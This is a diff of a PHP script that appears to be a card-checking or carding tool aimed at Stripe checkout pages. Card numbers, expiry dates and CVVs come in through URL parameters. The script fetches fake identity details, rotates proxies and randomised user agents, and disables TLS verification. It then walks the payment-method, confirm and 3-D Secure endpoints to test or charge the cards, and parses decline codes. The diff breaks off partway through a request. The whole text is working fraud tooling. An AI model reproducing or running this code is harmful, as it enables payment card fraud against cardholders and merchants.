@@ -1,9 +1,6 @@
 <?php
 
 error_reporting(0);
-$timezones = timezone_identifiers_list();
-$random_timezone = $timezones[array_rand($timezones)];
-date_default_timezone_set($random_timezone);
 
 // Random information API
 $resp = file_get_contents("https://lehikasa.online/random/?xiao=us");
@@ -22,66 +19,11 @@ $regionId   = $a->hello->street->regionId ?? "12";
 $country    = $a->hello->street->country ?? "United States";
 $fivenums   = rand(1000, 9999); // Generate 5 random numbers
 
-//SET YOUR RANDOM HEADERS
-$headers = array(
-    'User-Agent: ' => array(
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Edge/16.16299',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
-  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).'',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko',
-  'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko'
-),
-    // add more headers here
-);
-
-$randomHeaders = array();
-
-// SET YOUR COOKIES
-if (!is_dir("cookies")) {
-    mkdir("cookies");
-}
-$gon = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie" . rand(10000, 9999999) . ".txt";
-$cookietempfile = fopen($gon, 'w+');
-fclose($cookietempfile);
-
-//================ [ FUNCTIONS & LISTA ] ===============//
-
-function GetStr($string, $start, $end){
-    $string = ' ' . $string;
-    $ini = strpos($string, $start);
-    if ($ini == 0) return '';
-    $ini += strlen($start);
-    $len = strpos($string, $end, $ini) - $ini;
-    return trim(strip_tags(substr($string, $ini, $len)));
-}
-
-
-function multiexplode($seperator, $string){
-    $one = str_replace($seperator, $seperator[0], $string);
-    $two = explode($seperator[0], $one);
-    return $two;
-    };
-$lista = $_GET['cards'];
-    $cc = multiexplode(array(":", "|", ""), $lista)[0];
-    $mes = multiexplode(array(":", "|", ""), $lista)[1];
-    $ano = multiexplode(array(":", "|", ""), $lista)[2];
-    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
-    $mask = substr_replace($lista,'xxxxxxxxxxxx',0,12);
-
-if (strlen($mes) == 1) $mes = "0$mes";
-if (strlen($ano) == 2) $ano = "20$ano";
-
-$pklive = $_GET['pklive'];
-$cslive = $_GET['cslive'];
+$sec = $_GET['cslive'];
+$pk = $_GET['pklive'];
 $colink = $_GET['colink'];
-$xamount = $_GET['xamount'];
-$xemail = $_GET['xemail'];
-
+$amt = $_GET['xamount'];
+$email = $_GET['xemail'];
 
 $hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
 $ip = isset($_GET['ip']) ? $_GET['ip'] : '';
@@ -97,6 +39,24 @@ $rotateips = $ips_accounts[array_rand($ips_accounts)];
 $proxy = !empty($ip) ? $ip : ''.$rotateips.'';
 $proxyauth = !empty($hydra) ? $hydra : '';
 
+$email2 = urlencode($email);
+if(empty($email)) {
+$email = 'aliceschuberg'.rand(0000, 9999).'@gmail.com';
+}
+$xemail = $email;
+
+list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
+$scc = implode('+', str_split($cc, 4));
+$m = ltrim($mm, "0"); $mm === "10" ? $m = "10" : $mm;
+strlen($yyyy) == 2 ? $yyyy = '20' . $yyyy : null; $yy = substr($yyyy, 2,2);
+$card = "$cc|$mm|$yy|$cvv";
+$type = $cc[0] == '4' ? 'Visa' : 'Mastercard'; 
+
+
+function g($str, $start, $end, $decode=false){   
+    return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
+  }
+
 function c($l){
     $x = '0123456789abcdefghijklmnopqrstuvwxyz';
     $y = strlen($x);
@@ -108,217 +68,242 @@ function c($l){
     return $z;
   } 
 
-$newguid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
-$newmuid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
-$newsid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
-$newsessionID = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
+$guid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
+$muid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
+$sid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
+$sessionID = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
 
-$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
+// SET YOUR COOKIES
+if (!is_dir("cookies")) {
+    mkdir("cookies");
+}
+$cookies = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie" . rand(10000, 9999999) . ".txt";
+$cookietempfile = fopen($cookies, 'w+');
+fclose($cookietempfile);
 
-$ip_api_urls = array(
-    'https://ipinfo.io/ip',
-    //'https://api.ipify.org/',
-    'https://checkip.amazonaws.com/',
-    'https://ipapi.co/ip/',
-    'http://ipv4.icanhazip.com/'
-    
-);
-$testmyip = $ip_api_urls[array_rand($ip_api_urls)];
+$mask = substr_replace($cc,'xxxxxxxxxx',0,10);
+$extrap = $mask."|".$mm."|".$yy;
+$extrap;
+///////////////=============================////////////////////////
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $testmyip);
+curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json');
 if (!empty($proxy)) {
     curl_setopt($ch, CURLOPT_PROXY, $proxy);
     if (!empty($proxyauth)) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
     }
 }
-//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$curl_scraped_page = curl_exec($ch);
-$curl_error = curl_error($ch);
-curl_close($ch);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+ $ip = curl_exec($ch);
+$ips = g($ip,'"query":"','"');
+$myip = "<font class='text-white'>$ips</font><br>";
 
-if ($curl_error) {
-    echo "<span style='background-color: white; color: red;' class='badge'>$curl_error</span><br>";
-    exit();
-}
-
-echo "$curl_scraped_page<br>";
-
-#########if the co link has tos
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'');
 if (!empty($proxy)) {
     curl_setopt($ch, CURLOPT_PROXY, $proxy);
     if (!empty($proxyauth)) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
     }
 }
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'');
 curl_setopt($ch, CURLOPT_POST, 1);
-$postfield = 'eid=NA&consent[terms_of_service]=accepted&key='.$pklive.'';
-
-curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
-$curl2 = curl_exec($ch);
+$headers = array();
+$headers[] = 'accept: application/json';
+$headers[] = 'content-type: application/x-www-form-urlencoded';
+$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
+$headers[] = 'origin: https://checkout.stripe.com';
+$headers[] = 'sec-fetch-site: same-site';
+$headers[] = 'sec-fetch-mode: cors';
+$headers[] = 'sec-fetch-dest: empty';
+$headers[] = 'referer: https://checkout.stripe.com/';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&consent[terms_of_service]=accepted&key='.$pk.'');
+$curl = curl_exec($ch);
 curl_close($ch);
 
-#########1st
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/init');
 if (!empty($proxy)) {
     curl_setopt($ch, CURLOPT_PROXY, $proxy);
     if (!empty($proxyauth)) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
     }
 }
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'accept: application/json';
+$headers[] = 'content-type: application/x-www-form-urlencoded';
+$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
+$headers[] = 'origin: https://checkout.stripe.com';
+$headers[] = 'sec-fetch-site: same-site';
+$headers[] = 'sec-fetch-mode: cors';
+$headers[] = 'sec-fetch-dest: empty';
+$headers[] = 'referer: https://checkout.stripe.com/';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pk.'&eid=NA&browser_locale=en-GB&redirect_type=url');
+$curl = curl_exec($ch);
+curl_close($ch);
+ $curl;
+ $amttt = g($curl,'"unit_amount_decimal": "','"');
+ $xmail = g($curl,'"customer_email": "','"');
+
+
+$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($ch, CURLOPT_POST, 1);
-//$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$full_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][state]='.$state_full.'&guid='.$newguid.'&muid='.$newmuid.'&sid='.$newsid.'&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';
-$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$full_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&guid='.$newguid.'&muid='.$newmuid.'&sid='.$newsid.'&key='.$pklive.'&payment_user_agent=stripe.js%2Fb7526fd6ae%3B+stripe-js-v3%2Fb7526fd6ae%3B+checkout';
-
-curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
-  $curl0 = curl_exec($ch);
-curl_close($ch);
-
- 
-$pm = Getstr($curl0,'"id": "','"');
- "<br>";
- "<br>";
-
-
-##########2nd
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL,$url);
 if (!empty($proxy)) {
     curl_setopt($ch, CURLOPT_PROXY, $proxy);
     if (!empty($proxyauth)) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
     }
 }
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/confirm');
 curl_setopt($ch, CURLOPT_POST, 1);
-$postfield = 'eid=NA&payment_method='.$pm.'&expected_amount='.$xamount.'&last_displayed_line_item_group_details[subtotal]='.$xamount.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pklive.'';
-
-curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
- $curl1 = curl_exec($ch);
+$headers = array();
+$headers[] = 'accept: application/json';
+$headers[] = 'content-type: application/x-www-form-urlencoded';
+$headers[] = 'sec-ch-ua-mobile: ?1';
+$headers[] = 'save-data: on';
+$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
+$headers[] = 'sec-ch-ua-platform: "Android"';
+$headers[] = 'origin: https://checkout.stripe.com';
+$headers[] = 'sec-fetch-site: same-site';
+$headers[] = 'sec-fetch-mode: cors';
+$headers[] = 'sec-fetch-dest: empty';
+$headers[] = 'referer: https://checkout.stripe.com/';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]=hak&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.$street.'&billing_details[address][city]=Manila&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51%3B+checkout');
+$pm = curl_exec($ch);
 curl_close($ch);
+$id = g($pm, '"id": "','"');
 
- 
-$three_d_secure_2_source = Getstr($curl1,'"three_d_secure_2_source": "','"');
 
-$client_secret = Getstr($curl1,'"client_secret": "','"');
-"<br>";
-$pi = Getstr($curl1,'"client_secret": "','_secret_');
-"<br>";
-"<br>";
-$dc2 = Getstr($curl1,'"decline_code": "','"');
-$mes1 = Getstr($curl1,'"message": "','"');
-$success = Getstr($curl1,'"success_url": "','"');
-$tos = Getstr($curl2,'"terms_of_service": "','"');
 
-#############3rd
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/confirm');
 if (!empty($proxy)) {
     curl_setopt($ch, CURLOPT_PROXY, $proxy);
     if (!empty($proxyauth)) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
     }
 }
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'accept: application/json';
+$headers[] = 'content-type: application/x-www-form-urlencoded';
+$headers[] = 'sec-ch-ua-mobile: ?1';
+$headers[] = 'save-data: on';
+$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36';
+$headers[] = 'sec-ch-ua-platform: "Android"';
+$headers[] = 'origin: https://checkout.stripe.com';
+$headers[] = 'sec-fetch-site: same-site';
+$headers[] = 'sec-fetch-mode: cors';
+$headers[] = 'sec-fetch-dest: empty';
+$headers[] = 'referer: https://checkout.stripe.com/';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount='.$amttt.'&last_displayed_line_item_group_details[subtotal]='.$amttt.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pk.'');
+$ppage2 = curl_exec($ch);
+curl_close($ch);
+$client_secret = g($ppage2, '"client_secret": "','"');
+$xplode = explode('_secret', $client_secret);
+$pi = $xplode[0];
+$three_d = g($ppage2, '"three_d_secure_2_source": "','",');
+$message = g($ppage2, '"message": "','"');
+$success = g($ppage2, '"success_url": "','"');
+
+
+
+
+
+$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
-curl_setopt($ch, CURLOPT_POST, 1);
-
-// random user-agents
-$userAgents = array(
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Edge/16.16299',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
-  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).'',
-  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko',
-  'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko'
-);
-
-$randomUserAgents = array();
-
-for ($i = 0; $i < 10; $i++) {
-  $randomUserAgents[] = $userAgents[array_rand($userAgents)];
-}
-
-// Now you can use $randomUserAgents array in your postfield
-$postfield = 'source='.$three_d_secure_2_source.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22873%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22'.$randomUserAgent.'%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pklive.'';
-
-
-curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
- $result = curl_exec($ch);
-curl_close($ch);
-
- "<br>";
- "<br>";
-###############4th
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL,$url);
 if (!empty($proxy)) {
     curl_setopt($ch, CURLOPT_PROXY, $proxy);
     if (!empty($proxyauth)) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
     }
 }
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pklive.'&is_stripe_sdk=false&client_secret='.$client_secret.'');
-curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-
-curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
-$result1 = curl_exec($ch);
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'accept: application/json';
+$headers[] = 'content-type: application/x-www-form-urlencoded';
+$headers[] = 'sec-ch-ua-mobile: ?1';
+$headers[] = 'save-data: on';
+$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
+$headers[] = 'sec-ch-ua-platform: "Android"';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$three_d.'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImY2NjQ4NWVmLTQ1ZjItNDEyZi05Y2I3LWE5ZGFhMTE0MTY2ZCJ9%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-GB%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22851%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+11%3B+M'.rand(11,99).'G)+AppleWebKit%2F'.rand(111,999).'.'.rand(11,99).'+(KHTML%2C+like+Gecko)+Chrome%2F'.rand(11,99).'.0.0.0+Mobile+Safari%2F'.rand(111,999).'.'.rand(11,99).'%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pk.'');
+$authenticate = curl_exec($ch);
 curl_close($ch);
 
- $result1;
- $dcode1 = json_decode($result1)->last_payment_error->decline_code;
- "<br>";
- "<br>";
- "<br>";
- $mes2 = Getstr($result1,'"message": "','"');
- $status = Getstr($result1,'"status": "','"');
- $msg = json_decode($result1)->last_payment_error->message;
-###############4th
+
+
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'?key='.$pklive.'&eid=NA');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pk.'&is_stripe_sdk=false&client_secret='.$client_secret.'');
+if (!empty($proxy)) {
+    curl_setopt($ch, CURLOPT_PROXY, $proxy);
+    if (!empty($proxyauth)) {
+        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
+    }
+}
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-
-curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
-curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
-$result2 = curl_exec($ch);
+$headers = array();
+$headers[] = 'accept: application/json';
+$headers[] = 'content-type: application/x-www-form-urlencoded';
+$headers[] = 'sec-ch-ua-mobile: ?1';
+$headers[] = 'save-data: on';
